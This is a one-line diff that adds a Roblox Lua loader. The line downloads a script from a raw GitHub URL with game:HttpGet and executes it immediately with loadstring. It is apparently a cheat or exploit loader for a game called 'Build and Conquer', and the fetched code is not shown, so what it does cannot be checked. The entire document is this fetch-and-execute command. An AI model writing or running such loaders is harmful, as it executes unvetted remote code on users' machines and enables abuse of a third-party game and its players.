@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/build-and-conquer-v0-1-spam6-m3l90mozhz7fr6.lua"))()
